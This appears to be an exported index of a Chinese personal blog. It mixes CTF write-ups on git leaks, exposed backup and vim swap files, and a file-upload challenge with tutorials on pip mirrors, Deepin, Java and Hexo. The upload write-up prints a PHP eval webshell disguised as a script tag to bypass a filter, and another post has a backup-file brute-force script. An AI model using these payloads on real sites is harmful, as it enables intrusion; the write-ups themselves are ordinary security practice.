a782，这里的a782是commit的。\n\n在里面寻找，果然找到了flag。\n0x0002 Stash一开始还是利用githacker工具clone目录到本机，考察git stash命令。\n\n可以先使用git stash list看看stash了那些储存。然后使用git stash show stash@&#123;1&#125; -p查看存储的改动。\n\n\n0x0003 index既然是index找答案。我就先去试着看了一下index文件结果他居然是乱码，我无能为力，之前没搞过，不知道怎么看index区文件啊。所以就剑走偏锋去使用了git log，然后就用和第一题的一样办法，很快得到了flag。\n\n但是毕竟index的方法还是不会，所以只能求助百度了，在网络上学习了一下，用git ls-files就可以查看暂存区文件，然后就会看到有一个txt文件和两个html文件，txt文件总是那么引人注意，所以就想先查看一下txt文件。先使用git ls-files -s查看对应的blog对象，再使用git cat-file-p 97a5 来访问txt。flag直接出现，nice啊。\n\n总结当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。\n1、git泄露会用到一个非常好用的工具，那就是GitHacker，他可以轻松吧泄露的.git目录clone到我们的本机上。可以查看其更新记录。\n2、这题考察的是git stash命令。这里我之前没有用过git的这些命令也确实是不知。学习一下他人的blog：https://www.cnblogs.com/zndxall/archive/2018/09/04/9586088.html\n\n\n\n\n\n\n\n\n\n（1）**git stash** save &quot;save message&quot;  : 执行存储时，添加备注，方便查找，只有git stash 也要可以的，但查找时不方便识别。\n（2）**git stash list**  ：查看stash了哪些存储\n（3）**git stash show** ：显示做了哪些改动，默认show第一个存储,如果要显示其他存贮，后面加stash@{$num}，比如第二个 git stash show stash@{1}\n（4）**git stash show -p** : 显示第一个存储的改动，如果想显示其他存存储，命令：git stash show  stash@&#123;$num&#125;  -p ，比如第二个：git stash show  stash@&#123;1&#125;  -p\n（5）**git stash apply** :应用某个存储,但不会把存储从存储列表中删除，默认使用第一个存储,即stash@{0}，如果要使用其他个，git stash apply stash@&#123;$num&#125; ， 比如第二个：git stash apply stash@&#123;1&#125; \n（6）**git stash pop** ：命令恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@{0}，如果要应用并删除其他stash，命令：git stash pop stash@{$num} ，比如应用并删除第二个：git stash pop stash@{1}\n（7）git stash drop stash@{$num} ：丢弃stash@{$num}存储，从列表中删除这个存储\n（8）**git stash clear** ：删除所有缓存的stash\nsctfhub{2117289cb3b37c4dcea5b6001401ec26b38fc277}\n3、这题本意是考察index区，我钻了空子在log里也得到了flag。\n","slug":"每日练习-git泄露","date":"2020-04-01T03:04:46.000Z","categories_index":"CTF","tags_index":"WEB,信息泄露","author_index":"A1andNS"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"今天在CTFHub上做了一些题，把他们记录学习一下。就是之前的工具包是Windows端的，幸好一些还是跨平台的。最近要去找个Linux下的工具包了。\n今天主要干技能树里面信息泄露类的内容。\n0x0001 目录遍历这个因为是技能树，主要是让人知道目录遍历的危害。很直接进去很明显的目录遍历。\n依次遍历所给目录就可以找到3/flag.txt\nctfhub{0ed8c88cb111f71a407977026a969e78d8dc34b4}\n0x0002 PHPINFO这个更加直接，很明显他是先要告诉我们PHPINFO的重要性，phpinfo()函数会把很多重要信息泄露出来，这也就是为什么他会在信息泄露类了，要是phpinfo不当使用，让重要的系统信息、PHP版本等对外公开了，这将是十分危险的。\n在PHPINFO页面直接使用页面查找，就找出了flag。\n ctfhub{8066c78cc1c995466cb74075cc1e2b50a4efdfa4}\n0x0003 网页源码看题目名字直指源码泄露。\n题目提供了有用的提示\n1、常见的网站源码备份文件后缀\n\ntar\ntar.gz\nzip\nrar\n\n2、常见的网站源码备份文件名\n\nweb\nwebsite\nbackup\nback\nwww\nwwwroot\ntemp\n\n那么我开工了，我第一时间想到的就是搞一个字典然后用字典去请求，找出状态码200的就OK了。于是我写了个脚本：\nimport requests\n\ndef getHTMLText(url):        \n    try:\n        respon = requests.get(url)\n        respon.raise_for_status()\n        respon.encoding = 'utf-8'\n        print(url)\n        return respon.txt\n    except:\n        return \"\"\n\nname = ['web','website','backup','back','www','wwwroot','temp']\nback = ['tar','tar.gz','zip','rar']\nfor i in name:\n    for j in back:\n        fullname = i +'.'+ j\n        url = \"http://challenge-9cc768c61ee393de.sandbox.ctfhub.com:10080/\"+fullname\n        s = getHTMLText(url)\n        print(s)\n\n\n访问这个url得到一个压缩包。\n\n但是事情并没有这么简单，访问了打开flag_1800031554.txt\n\n里面并没有flag,而是问flag在哪，这里就要考虑备份文件是用来干什么的。备份文件是用来备份网站源代码的，那么在网页中也会有这个文件存在吧。所以就去使用url访问这个文件看看。\n果然出了flag\n\n0x0004 bak文件一进去就明显提示，就是要找index.php的代码，但是php是后端在前端是看不到的。可惜备份文件不小心留在了web目录下啊！\n\n所以就范文http://challenge-2083e39bcae17eeb.sandbox.ctfhub.com:10080/index.php.bak，备份文件就被下载下来了。\n\nflag很明显，就是ctfhub{df52fef8c844654e644fc97e58abb7bb1a7744d3}\n0x0005 vim缓存说句实话，看到vim缓存我是不知道的。所以我也不知道vim缓存是如何存在的。后来上网查询了一下，vim缓存文件的后缀是.swp,再次意外退出后就会产生.swo文件，而第三次产生的就是.swn。这下就知道，意外退出的vim缓存文件是什么了。这里我一开始一直尝试的是index.php.swp,所以一直都是not found了。这里有一点要注意，由于是vim缓存文件.index.php.swp文件才对。\n然后就能够下载到这个文件了\n\n它既然是vim缓存自然是使用vim打开了。\n\n如图得到flag\nctfhub{e6517a906ac248e1e33dd8f8e66b02693ec4d836}\n0x0006 .DS_Storetips:.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。\n直接访问http://challenge-78def8513b138f6c.sandbox.ctfhub.com:10080/flag.DB_Store\n\n发现一个名字及其长的文件，到浏览器访问一下。\n\nflag就出了，ctfhub{0364986c175041a47c7f4d5d7b5aba9c0f21316b}\n总结1、目录遍历的出现让攻击者可以随意去范文目录，如同使用自己的电脑一样。这真是太危险了。目录遍历主要是因为web中间件配置错误和目录权限配置不当，使得在网站目录下没有索引文件时出现直接出现目录和字目录。比如修改Apach中的配置文件httpd.conf和vhosts.conf 。关键就是配置+号就会导致目录遍历出现，-号就可以避免目录遍历出现。\n2、PHPinfo不当使用后果严重\n\n这些信息对于攻击者而言简直是如虎添翼，在渗透工作中，这些也会极大帮助测试人员进行渗透。这就是为什么PTES中信息收集是首要工作了，所以必须小心，不要把这些重要和敏感信息公开化。\n3、在做这一题的时候，我没有去使用目录遍历的工具，主要是我之前没有用过，也不知道用什么工具，所以就只能手工写了一个脚本来找了。还有就是在拿到那个没有flag的flag文件时，我也是有点懵了，做的太少，好一会才反应过来。看来还是要多做题，事后我找了一个工具叫做direserch。\n4、备份文件真的是要小心处理，千万不能随便放在web目录下，不然后端都被人看光了。。\n5、vim缓存文件一般都会以.开头，.filename.swp\n6、DB—Store文件是MacOS中特有的文件系统隐藏文件。\n","slug":"每日练习（CTFHUb之信息泄露类）","date":"2020-03-31T03:12:22.000Z","categories_index":"CTF","tags_index":"WEB,信息泄露","author_index":"A1andNS"},{"id":"ca781548f0f3d71dbc85540a0ea23e48","title":"Deepin下的pip安装与pip换源","content":"之前写过了一篇关于Windows上pip换源的博客，现在换到Deepin上来又遇到安装pip和换源了。\nPIP安装在Deepin下进行pip的安装还是比较容易的，只需要在终端使用apt-get就可以安装\n#为python2安装pip\n$ sudo apt-get install python-pip\n#为python3安装pip\n$ sudo apt-get install python3-pip\n#这时可能由于deepin源的缘故，pip版本较低，想要升级到高版本，可以使用一下命令\n$ pip3 install --upgrade -i https://pypi.tuna.tsinghua.edu.cn/simple\n$ python -m pip install --upgrade -i https://pypi.tuna.tsinghua.edu.cn/simple\n#上面其实也是临时替换源的操作\n\n通过上面的一系列操作就可以成功安装pip了。\nPIP换源上面有临时换源我就不说了，下面直接看永久换源\n#python3配置\n$ sudo pip3 config set global.index-url https://mirrors.aliyun.com/pypi/simple/\n#python2配置\n$ sudo python -m pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/\n\n或者在~/home/用户名/.config/pip目录下创建一个pip.conf文件，写入一下内容：\n[global]\nindex-url&#x3D;https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;\n\n这样就可以换源到清华的源了。\n下面是常见的几个国内pip源（我自己使用的是清华大学的源）：阿里云 https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;\n中国科技大学 https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;\n豆瓣(douban) http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;\n清华大学 https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;\n中国科学技术大学 http:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple\n\n安装换源中遇到的问题1、在安装换源的过程还真是遇到不少问题。在安装后，想要使用命令永久换源，却出现提示说config命令不存在，出现这种情况很有可能是在使用apt-get下载pip时有部分无法安装。一开始我也不懂捣腾了好久，知道我使用apt命令再装一次时，发现里面有些内容居然是使用IPv6进行传输的。而我之前为了让wineQQ能够接收图片，我关闭了网络的IPv6功能，所以导致安装不完整。开启IPv6后再安装就好了，pip命令既可以配置永久源了。\n2、在Deepin下，系统自带了py2和py3，所以在两个版本都存在的情况下命令的使用就略有不同了，我的系统是pip默认是使用python3的。所以在需要执行python2的pip命令时就需要在前面加上python -m。这样才是对python2的pip进行操作。不知道为什么pip和pip3使用命令配置永久源是会发生冲突，导致在.config目录下只能有pip目录存在，而不会分为pip3和pip。也许是我的安装顺序是先安装python3-pip所以pip3成为了主pip。但是也没有关系，就是每次使用python2的pip是要采取临时还源。不过大家也知道了python2在今年就退役了，所以python正常就好了，python2可以装库和运行老脚本就OK了。\n","slug":"Deepin下的pip安装与pip换源","date":"2020-03-30T09:18:40.000Z","categories_index":"资源教程","tags_index":"Python,Deepin","author_index":"A1andNS"},{"id":"73639b6461949d2614a6cc8888d8f8e4","title":"wineQQ和wineTIM无法获取图片和更新头像解决方案","content":"刚刚从Windows平台搬家到Deepin，就遭遇了当头一棒啊。到Windows平台第一件事就是先装个QQ，这里自然装的是Wine QQ了，毕竟QQ for Linux有点复古。。结果在安装完flash后居然无法接受图片，头像也不会更新。并且是随机的，有时好有时坏。换了个wine TIM结果也是一样的情况，Linux萌新暴毙。。。\n所以就办法了，只能求救百度君，发现deepin论坛也有很多人出现了和我一样的情况。并且最终找到了解决方案，那就是关闭IPv6。于是就试了一下，我就按照网络上的一些博客修改了sysctl.config文件，关闭了ipv6，并且清空了wine QQ的缓存。但是很可惜这种办法的有效性就一次，关个机重启一下，发现就又不行了。\n我的办法陷入沉思。。。。。。\n但是get到了解决方案的原理，那就是关闭IPv6，好在deepin优秀的GUI界面，其实这操作并不难。\n1、首先就是打开控制中心，找到网络处\n\n2、找到你所连接的网络，进入网络配置页面\n\n3、设置IPv6方法为忽略\n\n4、记得要点保存\n\n此时可以发现IPv6网络就被忽略了，通过ifconfig命令查询，可以看到没有IPv6地址了，这就说明关闭了IPv6。\n\n这个时候wineQQ和wineTIM都可以正常接受图片和更新头像了，并且下次开机还是连接此网络是依旧可以正常使用。\n缺点缺点就是当你更换一个网络时，必须要重复上面的步骤来配置网络。也就是说在一个网络中只需要配置一次，但是在更换网络时，要对新网络进行配置。\n","slug":"wineQQ和wineTIM无法获取图片和更新头像解决方案","date":"2020-03-29T08:40:41.000Z","categories_index":"资源教程","tags_index":"deepin","author_index":"A1andNS"},{"id":"b303a78f2cf6055efc20cd0694679229","title":"ichunqiu练习场WEB类型2题","content":"今天就先做两题ichunqiu练习场的两题WEB题，Deepin还有一些东西没有搞定，搞好了就可以正式起航了。\n0x0001上传任意文件都可以成功，上传一句话木马后发现&lt;?和php都被过滤了\n把PHP改成大写也无济于事，依旧是会被过滤。所以这样肯定没法连接使用了，于是只能去百度看看有没有解决方案不出现敏感符号结果还真的有\n&lt;script language&#x3D;&quot;pHp&quot;&gt;@eval($_POST[&#39;sb&#39;]）&lt;&#x2F;script&gt;\n\n使用这个上传，就不会被过滤，再用中国AntSword连接，就可以看到tips里面的flag.php文件了，打开后发现flag隐藏其中\n&lt;?php\necho 'here_is_flag';\n'flag&#123;963dbf92-02f5-4cb5-911e-50879424800e&#125;';\n\n所以flag就是：flag{963dbf92-02f5-4cb5-911e-50879424800e}\n0x0002一开始看到一大串，有点懵。看到最后的那个格式，感觉很可能是凯撒，所以直接就用CTFCrack给凯撒爆破了一下。\nBE5650G - 0BA CH50A A0D THE CH50ESE 9505ST4O 1F EDUCAT510 A001U0CED 910DAO A0 ENTE0S510 1F THE54 EN5ST50G 2A4T0E4SH52 T1 50C14214ATE F5T0ESS A0D BAS7ETBA88 DEVE8129E0T 50 E8E9E0TA4O, 95DD8E A0D H5GH SCH118S AC41SS CH50A.THE A001U0CE9E0T MAS 9ADE AT A S5G050G CE4E910O T1DAO BO 0BA CH50A CE1 DAV5D SH1E9A7E4 A0D NU TA1, D54ECT14 GE0E4A8 1F THE 50TE40AT510A8 C112E4AT510 A0D ENCHA0GE DE2A4T9E0T 1F THE 9505ST4O 1F EDUCAT510.“ME A4E ENC5TED T1 B41ADE0 1U4 2A4T0E4SH52 M5TH THE 9505ST4O 1F EDUCAT510 T1 9A7E A 810G-8AST50G 592ACT 10 THE 85VES 1F CH50ESE STUDE0TS TH41UGH A 6150T8O-DES5G0ED BAS7ETBA88 CU445CU8U9 A0D A M5DE 4A0GE 1F SCH118 BAS7ETBA88 241G4A9S,” SA5D SH1E9A7E4. “TH5S C1995T9E0T 9A47S A01THE4 958EST10E 50 THE 0BA’S O1UTH A0D BAS7ETBA88 DEVE8129E0T EFF14TS 50 CH50A.” F8AG { GS182D9HCT9ABC5D}\n有点内味了，接下来就是考英语了，猜数字是什么了。\n很明显8就是L，把8全部换成L，得到如下内容。\n‘BE5650G - 0BA CH50A A0D THE CH50ESE 9505ST4O 1F EDUCAT510 A001U0CED 910DAO A0 ENTE0S510 1F THE54 EN5ST50G 2A4T0E4SH52 T1 50C14214ATE F5T0ESS A0D BAS7ETBALL DEVEL129E0T 50 ELE9E0TA4O, 95DDLE A0D H5GH SCH11LS AC41SS CH50A.THE A001U0CE9E0T MAS 9ADE AT A S5G050G CE4E910O T1DAO BO 0BA CH50A CE1 DAV5D SH1E9A7E4 A0D NU TA1, D54ECT14 GE0E4AL 1F THE 50TE40AT510AL C112E4AT510 A0D ENCHA0GE DE2A4T9E0T 1F THE 9505ST4O 1F EDUCAT510.\\n”ME A4E ENC5TED T1 B41ADE0 1U4 2A4T0E4SH52 M5TH THE 9505ST4O 1F EDUCAT510 T1 9A7E A L10G-LAST50G 592ACT 10 THE L5VES 1F CH50ESE STUDE0TS TH41UGH A 6150TLO-DES5G0ED BAS7ETBALL CU445CULU9 A0D A M5DE 4A0GE 1F SCH11L BAS7ETBALL 241G4A9S,” SA5D SH1E9A7E4. “TH5S C1995T9E0T 9A47S A01THE4 95LEST10E 50 THE 0BA&#39;S O1UTH A0D BAS7ETBALL DEVEL129E0T EFF14TS 50 CH50A.” FLAG { GS1L2D9HCT9ABC5D}’\n看到了一个TH5S，马上就联想到了this，所以5就是I了，再一个替换，里目标更进一步了。\n‘BEI6I0G - 0BA CHI0A A0D THE CHI0ESE 9I0IST4O 1F EDUCATI10 A001U0CED 910DAO A0 ENTE0SI10 1F THEI4 ENISTI0G 2A4T0E4SHI2 T1 I0C14214ATE FIT0ESS A0D BAS7ETBALL DEVEL129E0T I0 ELE9E0TA4O, 9IDDLE A0D HIGH SCH11LS AC41SS CHI0A.THE A001U0CE9E0T MAS 9ADE AT A SIG0I0G CE4E910O T1DAO BO 0BA CHI0A CE1 DAVID SH1E9A7E4 A0D NU TA1, DI4ECT14 GE0E4AL 1F THE I0TE40ATI10AL C112E4ATI10 A0D ENCHA0GE DE2A4T9E0T 1F THE 9I0IST4O 1F EDUCATI10.\\n”ME A4E ENCITED T1 B41ADE0 1U4 2A4T0E4SHI2 MITH THE 9I0IST4O 1F EDUCATI10 T1 9A7E A L10G-LASTI0G I92ACT 10 THE LIVES 1F CHI0ESE STUDE0TS TH41UGH A 61I0TLO-DESIG0ED BAS7ETBALL CU44ICULU9 A0D A MIDE 4A0GE 1F SCH11L BAS7ETBALL 241G4A9S,” SAID SH1E9A7E4. “THIS C199IT9E0T 9A47S A01THE4 9ILEST10E I0 THE 0BA&#39;S O1UTH A0D BAS7ETBALL DEVEL129E0T EFF14TS I0 CHI0A.” FLAG { GS1L2D9HCT9ABCID}’\n根据0BA、CHI0A、A0D,可以推出0就是N。\n‘BEI6ING - NBA CHINA AND THE CHINESE 9INIST4O 1F EDUCATI1N ANN1UNCED 91NDAO AN ENTENSI1N 1F THEI4 ENISTING 2A4TNE4SHI2 T1 INC14214ATE FITNESS AND BAS7ETBALL DEVEL129ENT IN ELE9ENTA4O, 9IDDLE AND HIGH SCH11LS AC41SS CHINA.THE ANN1UNCE9ENT MAS 9ADE AT A SIGNING CE4E91NO T1DAO BO NBA CHINA CE1 DAVID SH1E9A7E4 AND NU TA1, DI4ECT14 GENE4AL 1F THE INTE4NATI1NAL C112E4ATI1N AND ENCHANGE DE2A4T9ENT 1F THE 9INIST4O 1F EDUCATI1N.\\n”ME A4E ENCITED T1 B41ADEN 1U4 2A4TNE4SHI2 MITH THE 9INIST4O 1F EDUCATI1N T1 9A7E A L1NG-LASTING I92ACT 1N THE LIVES 1F CHINESE STUDENTS TH41UGH A 61INTLO-DESIGNED BAS7ETBALL CU44ICULU9 AND A MIDE 4ANGE 1F SCH11L BAS7ETBALL 241G4A9S,” SAID SH1E9A7E4. “THIS C199IT9ENT 9A47S AN1THE4 9ILEST1NE IN THE NBA&#39;S O1UTH AND BAS7ETBALL DEVEL129ENT EFF14TS IN CHINA.” FLAG { GS1L2D9HCT9ABCID}’\n看到很多的1F和1N以及T1，我猜测1是O，6很明显是J，所以替换一下：\n‘BEIJING - NBA CHINA AND THE CHINESE 9INIST4O OF EDUCATION ANNOUNCED 9ONDAO AN ENTENSION OF THEI4 ENISTING 2A4TNE4SHI2 TO INCO42O4ATE FITNESS AND BAS7ETBALL DEVELO29ENT IN ELE9ENTA4O, 9IDDLE AND HIGH SCHOOLS AC4OSS CHINA.THE ANNOUNCE9ENT MAS 9ADE AT A SIGNING CE4E9ONO TODAO BO NBA CHINA CEO DAVID SHOE9A7E4 AND NU TAO, DI4ECTO4 GENE4AL OF THE INTE4NATIONAL COO2E4ATION AND ENCHANGE DE2A4T9ENT OF THE 9INIST4O OF EDUCATION.\\n”ME A4E ENCITED TO B4OADEN OU4 2A4TNE4SHI2 MITH THE 9INIST4O OF EDUCATION TO 9A7E A LONG-LASTING I92ACT ON THE LIVES OF CHINESE STUDENTS TH4OUGH A JOINTLO-DESIGNED BAS7ETBALL CU44ICULU9 AND A MIDE 4ANGE OF SCHOOL BAS7ETBALL 24OG4A9S,” SAID SHOE9A7E4. “THIS CO99IT9ENT 9A47S ANOTHE4 9ILESTONE IN THE NBA&#39;S OOUTH AND BAS7ETBALL DEVELO29ENT EFFO4TS IN CHINA.” FLAG { GSOL2D9HCT9ABCID}’\nANOTHE4和AC4OSS推测4为R，替换后：\n‘BEIJING - NBA CHINA AND THE CHINESE 9INISTRO OF EDUCATION ANNOUNCED 9ONDAO AN ENTENSION OF THEIR ENISTING 2ARTNERSHI2 TO INCOR2ORATE FITNESS AND BAS7ETBALL DEVELO29ENT IN ELE9ENTARO, 9IDDLE AND HIGH SCHOOLS ACROSS CHINA.THE ANNOUNCE9ENT MAS 9ADE AT A SIGNING CERE9ONO TODAO BO NBA CHINA CEO DAVID SHOE9A7ER AND NU TAO, DIRECTOR GENERAL OF THE INTERNATIONAL COO2ERATION AND ENCHANGE DE2ART9ENT OF THE 9INISTRO OF EDUCATION.\\n”ME ARE ENCITED TO BROADEN OUR 2ARTNERSHI2 MITH THE 9INISTRO OF EDUCATION TO 9A7E A LONG-LASTING I92ACT ON THE LIVES OF CHINESE STUDENTS THROUGH A JOINTLO-DESIGNED BAS7ETBALL CURRICULU9 AND A MIDE RANGE OF SCHOOL BAS7ETBALL 2ROGRA9S,” SAID SHOE9A7ER. “THIS CO99IT9ENT 9AR7S ANOTHER 9ILESTONE IN THE NBA&#39;S OOUTH AND BAS7ETBALL DEVELO29ENT EFFORTS IN CHINA.” FLAG { GSOL2D9HCT9ABCID}’\n根据9INISTRO和9IDDLE，我猜测9是M：\n‘BEIJING - NBA CHINA AND THE CHINESE MINISTRO OF EDUCATION ANNOUNCED MONDAO AN ENTENSION OF THEIR ENISTING 2ARTNERSHI2 TO INCOR2ORATE FITNESS AND BAS7ETBALL DEVELO2MENT IN ELEMENTARO, MIDDLE AND HIGH SCHOOLS ACROSS CHINA.THE ANNOUNCEMENT MAS MADE AT A SIGNING CEREMONO TODAO BO NBA CHINA CEO DAVID SHOEMA7ER AND NU TAO, DIRECTOR GENERAL OF THE INTERNATIONAL COO2ERATION AND ENCHANGE DE2ARTMENT OF THE MINISTRO OF EDUCATION.\\n”ME ARE ENCITED TO BROADEN OUR 2ARTNERSHI2 MITH THE MINISTRO OF EDUCATION TO MA7E A LONG-LASTING IM2ACT ON THE LIVES OF CHINESE STUDENTS THROUGH A JOINTLO-DESIGNED BAS7ETBALL CURRICULUM AND A MIDE RANGE OF SCHOOL BAS7ETBALL 2ROGRAMS,” SAID SHOEMA7ER. “THIS COMMITMENT MAR7S ANOTHER MILESTONE IN THE NBA&#39;S OOUTH AND BAS7ETBALL DEVELO2MENT EFFORTS IN CHINA.” FLAG { GSOL2DMHCTMABCID}’\nDEVELO2MENT看这个感觉2是P，看到2ARTNERSHI2，就更加确定是这样啦：\n‘BEIJING - NBA CHINA AND THE CHINESE MINISTRO OF EDUCATION ANNOUNCED MONDAO AN ENTENSION OF THEIR ENISTING PARTNERSHIP TO INCORPORATE FITNESS AND BAS7ETBALL DEVELOPMENT IN ELEMENTARO, MIDDLE AND HIGH SCHOOLS ACROSS CHINA.THE ANNOUNCEMENT MAS MADE AT A SIGNING CEREMONO TODAO BO NBA CHINA CEO DAVID SHOEMA7ER AND NU TAO, DIRECTOR GENERAL OF THE INTERNATIONAL COOPERATION AND ENCHANGE DEPARTMENT OF THE MINISTRO OF EDUCATION.\\n”ME ARE ENCITED TO BROADEN OUR PARTNERSHIP MITH THE MINISTRO OF EDUCATION TO MA7E A LONG-LASTING IMPACT ON THE LIVES OF CHINESE STUDENTS THROUGH A JOINTLO-DESIGNED BAS7ETBALL CURRICULUM AND A MIDE RANGE OF SCHOOL BAS7ETBALL PROGRAMS,” SAID SHOEMA7ER. “THIS COMMITMENT MAR7S ANOTHER MILESTONE IN THE NBA&#39;S OOUTH AND BAS7ETBALL DEVELOPMENT EFFORTS IN CHINA.” FLAG { GSOLPDMHCTMABCID}’\nbask7tball可以看出7就是K了，flag就是FLAG{GSOLPDMHCTMABCID}\n总结1、在文件上传漏洞中经常会设置一些过滤条件来限制webshell上传，这就需要对它进行绕过了。方法有很多，这题用到的是利用HTML标签来绕过。针对情况，可能要考虑过滤一下Tag里的language属性。\n2、细致的观察和一定的英语基础很重要。计算机系统起源与国外，系统底层都是使用English来进行开发的。所以English基础对于一个IT人员来说还是很重要的。还有就是要敢于尝试和用心发现有用信息或突破点，像Flag格式的内容是值得一试的。\n","slug":"ichunqiu练习场WEB类型2题","date":"2020-03-29T02:46:36.000Z","categories_index":"CTF","tags_index":"网络安全,WEB","author_index":"A1andNS"},{"id":"f13c765172561ff770df5ca554001d0a","title":"Java之数组练习","content":"今天写了一个简单Java程序，是关于Java数组的练习。题目如下图所示：\n\n运行环境\n\n\n\n\n\n\n\n\nDeepin: Deepin 15.11桌面版\nJava: Java14\n源代码Ipackage course;\n\npublic class DoubleArrayPractice &#123;\n\n\tpublic static void main(String[] args) &#123;\n\t\tdouble student[][] = &#123;&#123;85,90,96&#125;,&#123;90,85&#125;,&#123;90,90,80,95&#125;&#125;;\n\t\tint i,j;\n\t\tfor( i=0; i&lt;student.length; i++) &#123;\n\t\t\tfor( j=0; j&lt;student[i].length; j++) &#123;\n\t\t\t\tSystem.out.print(student[i][j]+\" \");\n\t\t\t&#125;\n\t\tSystem.out.print(\"\\n\");\n\t\t&#125;\n\t&#125;\n\n&#125;\n\n运行效果I\n源代码IIpackage course;\n\npublic class DoubleArrayProctice2 &#123;\n\n\tpublic static void main(String[] args) &#123;\n\t\tdouble student[][] = new double[3][];\n\t\tstudent[0] = new double[3];\n\t\tstudent[1] = new double[2];\n\t\tstudent[2] = new double[4];\n\t\tstudent[0][0] = 85;\n\t\tstudent[0][1] = 90;\n\t\tstudent[0][2] = 96;\n\t\tstudent[1][0] = 90;\n\t\tstudent[1][1] = 85;\n\t\tstudent[2][0] = 90;\n\t\tstudent[2][1] = 90;\n\t\tstudent[2][2] = 80;\n\t\tstudent[2][3] = 95;\n\t\tint i,j;\n\t\tfor( i=0; i&lt;student.length; i++) &#123;\n\t\t\tfor( j=0; j&lt;student[i].length; j++) &#123;\n\t\t\t\tSystem.out.print(student[i][j] + \" \");\n\t\t\t&#125;\n\t\t\tSystem.out.println();\n\t\t&#125;\n\t&#125;\n&#125;\n\n运行效果II\n问题与总结题目虽然很简单，但是我依旧卡了一下。主要是因为语法不够熟悉的问题，之前学习Python时，记住” “和’ ‘都是用来表示字符串，并且用哪一个都可以。然而在java中使用’ ‘则会出现问题，应该要使用” “来实现。\n问题语句System.out.print(student[i][j] + ‘ ‘);IDE语法上没有报错，但是在运行后得到的结果来看显然是出现了问题。就是因为” “误写成’ ‘而导致卡题了。还是要多去了解一门新学语言的特性，才能够更加有效的避免出错。\n","slug":"Java之数组练习","date":"2020-03-28T16:33:17.000Z","categories_index":"Java学习","tags_index":"Java","author_index":"A1andNS"},{"id":"9fb38c86a52e09d60ce76849ceeedc98","title":"Hexo博客从Windows迁移到deepin","content":"最近电脑换成了deepin系统，所以自然就要把blog搬迁到deepin上来。记录一下搬迁的过程，以备查看。毕竟刚入deepin，还不是很习惯。很多的东西也都要搞，比如Python和Java的环境以及虚拟机。好在博客、虚拟机和Java都搞定了，pyhton也搞定了。deepin是自带Python2和Python3，确实方便。\nhexo博客迁移\n\n\n\n\n\n\n\n\nWindows 10 1909 —&gt; Deepin 15.11\n首先是在Windows平台下对必要的博客文件进行备份了，如下图所示。\n\n我比较low，所以就用U盘备份了。然后在deepin安装好了之后拷到deepin里。这里先这样。然后要进行，deepin上的博客搭建。\ndeepin上是自带了git，就不必安装了，直接进行git配置。\n#git configuration\n$ git config --global user.name &quot;A1andNS&quot;\n$ git config --global user.email &quot;lilongxinalan@live.com&quot;\n$ git config --global core.autocrlf false\n$ git config --global gui.encoding utf-8\n#SSH\n$ ssh-keygen -t rsa -C &quot;lilongxinalan@live.com&quot;\n#生成SSH KEY\n$ cat ~&#x2F;.ssh&#x2F;id_rsa.pub\n#登录Github去setting中配置SSH，添加上面生成的SSH。\n#测试是否配置成功\n$ ssh -T git@github.com\n#如果成功，会显示一下内容\nHi A1andNS! You&#39;ve successfully authenticated, but GitHub does not provide shell access.\n\n在deepin环境下打开终端。执行一下命令\n#安装node.js\n$ sudo apt-get install node\n#注意这里的node是自带npm的，所以不必额外安装npm\n#查看安装情况和版本\n$ node -v\n$ npm -v\n#接下来就是安装hexo-cli\n$ sudo npm install -g hexo-cli\n#这里建议是跟换问国内源，我是跟换为了淘宝源\n$ npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org\n#检验配置情况\n$ npm info express\n#初始化hexo\n$ hexo init\n\n初始化后生成了一个博客目录，这时候我们就要用到之前Windows平台下备份的文件了，复制到该目录下替换。然后运行一下命令：\n$ hexo g    #生成\n$ hexo s    #启动服务\n\n可能出现的一些问题\n这里可能运行时会遇到错误，这是因为一些插件未安装导致的，这时候就要使用$ npm install 模块名去安装缺失的模块即可。\n在hexo中找不到hexo  service命令，$ npm install hexo-server --save\n在运行 $ hexo -s命令时，访问localhost://4000显示cannot GET /。这时候可能是因为public目录下没有index.html，所以先去public目录下查看情况。如果index.html不存在，那么就执$ hexo c和$ hexo g重新生成一次。在看看有没有，如果还是没有index.html，那么就可能是hexo缺少必要组件导致。所以需要使用$ npm audit fix ，查看缺少了说明组件，然后在通过$ npm install hexo-xxx-xxx安装即可。这些做完后再执行$ hexo c，$ hexo g重新生成静态文件。\n\n参考材料https://www.jianshu.com/p/af83fc73e525\nhttps://blog.csdn.net/qq_36180893/java/article/details/82320421\n","slug":"Hexo博客从Windows迁移到deepin","date":"2020-03-28T07:40:20.000Z","categories_index":"资源教程","tags_index":"hexo,node.js,deepin","author_index":"A1andNS"},{"id":"143867234a6f40c419fe07b5ab60f166","title":"中国大学排名爬虫","content":"今天学了网络爬虫相关的知识，就接着来学习一下实例。\n爬虫构建的3个步骤：\n\n\n\n\n\n\n\n\n\n\n从网络上获取网页的内容\n分析网页内容并提取有用数据到恰当的数据结构中\n利用数据结构展示或进一步处理数据。\n\n要想爬取排名，就要知道网页的源代码结构，这样才能爬取到有效信息。\n\n可以看出每一个大学的信息都被封装在&lt;tr&gt;&lt;/tr&gt;之间，每列内容采用&lt;td&gt;&lt;/td&gt;表示，以清华大学数据为例。\n&lt;tr class=\"alt\">\n    &lt;td>1&lt;/td>&lt;td>&lt;div align=\"left\">清华大学&lt;/div>&lt;/td>&lt;td>北京&lt;/td>\n    &lt;td>94.6&lt;/td>&lt;td class=\"hidden-xs need-hidden indicator5\" style=\"display: none;\">100.0&lt;/td>\n    &lt;td class=\"hidden-xs need-hidden indicator6\" style=\"display:none;\">98.30%&lt;/td>\n    &lt;td class=\"hidden-xs need-hidden indicator7\" style=\"display: 